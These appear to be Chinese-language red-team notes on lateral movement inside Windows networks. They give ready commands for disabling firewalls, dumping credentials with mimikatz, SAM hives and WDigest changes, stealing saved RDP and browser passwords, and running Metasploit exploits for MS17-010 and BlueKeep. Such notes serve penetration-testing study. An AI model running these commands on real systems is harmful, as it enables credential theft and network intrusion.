---
title: 内网横向移动技巧
---
# 内网信息收集

>  **信息收集的深度，直接关系到内网渗透测试结果的成败** 

**进入内网后，红队专家一般会在本机以及内部网络 开展进一步信息收集和情报刺探工作。**

包括收集当前计算机的网络连接、进程列表、命令执行历史记录、 数据库信息、当前用户信息、管理员登录信息、总结 密码规律、补丁更新频率等信息；

同时对内网的其他机器器的IP、主机名、开放端口服务等情况进行情报刺探。

再利用内网机器不及时修复漏洞、不做安全防护、同口令等弱点来进行横向渗透扩大战果。

对于含有域的内网，红队专家会在扩大战果的同时 去寻找域管理员登录的蛛丝马迹。

一旦发现某台服务 器有域管理员登录，就可以利用Mimikatz等工具去尝试获得登录账号密码明文，或者Hashdump工具去导出 NTLM哈希，继而实现对域控服务器的渗透控制。

在内网漫游过程中，红队专家会重点关注邮件服务 器权限、OA系统权限、版本控制服务器权限、集中运维管理平台权限、统一认证系统权限、域控权限等位 置，尝试突破核心系统权限、控制核心业务、获取核心数据，最终完成目标突破工作。

## 本机信息收集

**用户权限**

```bash
whoami /all
#查当前用户在目标系统中的具体权限

quser
#查当前机器中正在线的用户,注意管理员此时在不在

net user        
#查当前机器中所有的用户名

net localgroup
#查当前机器中所有的组名,了解不同组的职能,如,IT,HR,ADMIN,FILE

net localgroup "Administrators"
#查指定组中的成员列表
```

**系统基本信息**

```bash
ipconfig /all    
#获取本机网络配置

systeminfo
#查看系统的基本信息（系统版本、软件及补丁的安装情况，是否在域内）

net statistics workstation
#查看主机开机时间

echo %PROCESSOR_ARCHITECTURE%
#可查看系统的体系结构，是x86还是AMD64等

tasklist
#查看本机进程列表，分析是否存在VPN杀软等进程

wmic servcie list brief
#查看本机服务信息

wmic startup get command,caption    
#查看程序启动信息

schtasks /query /fo LIST /v
#查看系统计划任务
```

**网络信息**

```bash
netstat -ano
#查看本机所有的tcp,udp端口连接及其对应的pid

net share
#查看本机共享列表，和可访问的域共享列表

wmic share get name,path,status
#利用wmic查找共享列表

REG QUERY "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
#查看代理配置情况
```

`wmic`，Windows管理工具，提供了从命令行接口和批命令脚本执行系统管理的支持。

自xp之后系统自带 

**防火墙的信息和配置（配置防火墙需要管理员权限）**

```bash
#显示所有动态入站规则
netsh advfirewall firewall show rule name=all dir=in type=dynamic

#关闭防火墙
netsh advfirewall set allprofiles state off


#允许入站
netsh advfirewall firewall add rule name="pass nc" dir=in action=allow program="c:\nc.exe"

#允许出站
netsh advfirewall firewall add rule name="Allow nc" dir=out action=allow program="c:\nc.exe"

#3389端口放行
netsh advfirewall firewall add rule name="remote Desktop" protocol=TCP dir=in localport=3389 action=allow

#自定义防火墙日志存储位置
netsh advfirewall set currentprofile logging filename "c:\windows\temp\fw.log"

#Server 2003及之前的版本
netsh firewall set opmode disable	#关闭防火墙
netsh firewall add allowedprogram c:\nc.exe "allow nc" enable	#允许指定程序的全部连接
```

**操作当前机器的远程桌面（RDP）连接服务（开启和关闭RDP，需要管理员权限）**

```bash
wmic RDTOGGLE WHERE ServerName='%COMPUTERNAME%' call SetAllowTSConnections 1    
#开启

wmic RDTOGGLE WHERE ServerName='%COMPUTERNAME%' call SetAllowTSConnections 0    
#关闭

#下边的命令查询RDP服务的端口，返回一个十六进制的端口
REG QUERY "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /V PortNumber
```

## 主机发现

**查看各种历史记录（被动主机发现，动静小）**

```bash
#1、查看bash历史记录
history
cat ~/.bash_history

#2、查看hosts文件（看域名绑定），linux & windows
cat  /etc/hosts
type  c:\Windows\system32\drivers\etc\hosts

#3、查看mstsc对内和对外连接记录
https://github.com/Heart-Sky/ListRDPConnections
可能发现跨段的连接，还能定位运维人员主机

#4、浏览器浏览记录
查看浏览器中访问过的内网应用
```

**查看路由表**

```bash
netstat -r
```

**基于ARP**

 arp可以轻易bypass掉各类应用层防火墙，除非是专业的arp防火墙 

```bash
arp -a
#windows上查看arp缓存
```

**基于ICMP**

```bash
for /L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.2.%I | findstr "TTL="
```

**SPN扫描服务 （域）**

每个重要的服务在域中都有对用的SPN，所以不必使用端口扫描

只需利用SPN扫描就能找到大部分应用服务器

```bash
#查看当前域内的所有SPN（系统命令）
setspn -q */*
```

**端口扫描**

使用fscan扫描C段或B段的高危端口（21,22,445,3389,3306,1443,1521,6379）和Web端口

# 本机密码和散列值获取

## LM Hash和NTML Hash

Windows操作系统中的密码由两部分加密组成，即`LM Hash`和`NTML Hash`。

LM Hash（LAN Manager Hash），本质为DES加密，密码不足14位用`0`补全。

自`Server 2003`之后，Windows的认证方式均为NTML Hash。

自`Server 2008`开始默认禁用`LM Hash`， 当密码超过14位时候会采用NTLM加密

如果抓取的`LM Hash`为 `AAD3B435B51404EEAAD3B435B51404EE`，说明密码为空或`LM Hash`被禁用。

|      | 2003 | win7 | 2008 | 2012 |
| :--- | :--- | :--- | :--- | :--- |
| LM   | √    |      |      |      |
| NTLM | √    | √    | √    | √    |

**Hash一般存储在两个地方**

> **SAM文件**：存储在本机，对应本地用户
>
> **NTDS.DIT文件**：存储在域控上，对应域用户

## 获取凭证的快捷路径

翻用户桌面，可能存在服务器密码信息，甚至其它服务器

找内部wiki手册，邮箱等东西可能存在服务器IP和密码信息

## Server 2012 抓明文密码

**Server 08 及之前的版本可以直接抓明文密码**

将mimikatz上传到目标主机（需要免杀），并且要SYSTEM权限。

```bash
#读取散列值和明文密码
mimikatz.exe "privilege::debug" "log" "sekurlsa::logonpasswords" exit #123
```

 **Server 2012 抓取明文密码：**

> 手工修改注册表 + 强制锁屏 + 等待目标系统管理员重新登录+导出Hash+本地mimikatz抓明文

```bash
#修改注册表来让Wdigest Auth保存明文口令
reg add HKLMSYSTEMCurrentControlSetControlSecurityProvidersWDigest /v UseLogonCredential /t REG_DWORD /d 1 /f

#恢复
reg add HKLMSYSTEMCurrentControlSetControlSecurityProvidersWDigest /v UseLogonCredential /t REG_DWORD /d 0 /f
```

强制锁屏

```bash
rundll32.exe user32.dll,LockWorkStation
```

## 导出NTML Hash

### Sharpdump+ mimikatz本地读取

需要.NET 3.5版本框架，需要系统管理员权限

下载地址：https://github.com/GhostPack/SharpDump 

Dump 的文件默认是 bin 后缀，拖到本地机器把 bin 重命名为 zip，然后解压出来再丢给 mimikatz

```bash
mimikatz.exe “sekurlsa::minidump debug45” “sekurlsa::logonPasswords full” “exit”
```

### 注册表 + mimikatz本地读取

**（1）导出SAM和System文件**

 Win2000和XP需要先提到`SYSTEM`，Server 03开始直接可以reg save 也需要`系统管理员权限`

```bash
reg save hklm\sam sam.hive
reg save hklm\system system.hive
reg save hklm\security security.hive
```

**（2）mimikatz本地读取 NTML Hash**

> mimikatz可以从内存中提取明文编码、散列值、PIN和Kerberos票据；
>
> 还可以用来执行哈希传递、票据传递和构建黄金票据（Golden Ticket）。

```bash
#将导出的文件和mimikatz放到同一目录
mimikatz.exe "lsadump::sam /sam:sam.hive /system:system.hive /security:security.hive" exit
```

# 横向获取主机权限

## 获取历史连接凭证

**获取RDP连接凭证（保存过的）**

https://github.com/AlessandroZ/LaZagne

```bash
lazagne.exe windows
#git密码也能获取到
```

**获取历史连接`wifi`密码**

https://github.com/wangle201210/wifiPass

**获取XShell连接凭证**

https://github.com/dzxs/Xdecrypt

**浏览器历史记录和凭据**

https://github.com/moonD4rk/HackBrowserData

## 翻阅配置文件

**数据库配置文件**

JSP站

```
网站目录/WEB-INF/classes/database.properties
```

MySQL数据库找密码

```bash
find / -name user.MYD
/var/lib/mysql/mysql/user.MYD
#下载下来解密MD5得到root密码
```

**常见应用配置文件位置**

```
Tomcat:	$CATALINA_HOME/conf/server.xml
Apache:	/etc/httpd/conf/httpd.conf
Nginx:	/etc/nginx/nginx.conf
```

## 弱口令

1、用已知口令和常见弱口令构造字典，把`SNETCracker`代理进去扫SSH、RDP、MySQL等服务

2、Web后台弱口令和网络设备默认口令

3、技巧：如果能进到邮箱或wiki系统翻找到初始口令的话可以批量获取主机权限

## 系统漏洞

**MS17-010（CVE-2017-0143）**

MSF有两种方式：

- 反弹shell：`exploit/windows/smb/ms17_010_psexec`，需要在主机上进行端口转发
- 直接执行命令：`auxiliary/admin/smb/ms17_010_command`，直接在主机上执行命令

**Win7_RDP_RCE（CVE-2019-0708）**

```bash
auxiliary/scanner/rdp/cve_2019_0708_bluekeep

exploit/windows/rdp/cve_2019_0708_bluekeep_rce
```

## 未授权访问漏洞

```
Redis未授权访问
MongoDB未授权访问
Hadoop未授权访问漏洞
```

## Web应用漏洞

重点关注`Shiro反序列化`、`Weblogic`、`Struts2`等可直接利用的组件漏洞

还有SQL注入、文件上传等能Getshell的Web安全漏洞

## 重点目标系统

`Zabbix`等监控系统，默认口令（Admin/zabbix）

通过`堡垒机`默认口令进入堡垒机，直接主机权限路径分刷满

查看`wiki系统`很多组织会在其中公示一些初始密码，拿来去做弱口令扫描

## 凭证传递攻击

Hash传递攻击和票据传递攻击，是域渗透中的攻击方法

Hash传递攻击本地用户的话需要密码相同才能成功（域管理账户的话可以随意登录）

可以用CS直接去扫445然后抓了hash去传递

> hash注入的原理是，将我们预备好的目标机器的本地或者是域用户hash注入到本地的认证进程`lsass.exe`中去
>
> 使得本地在使用`ipc`登录目标机器的时候就如同自己登录自己的机器一样获得权限
>
> 需要支持受限管理员模式，Server 2012-r2后默认支持受限管理员模式

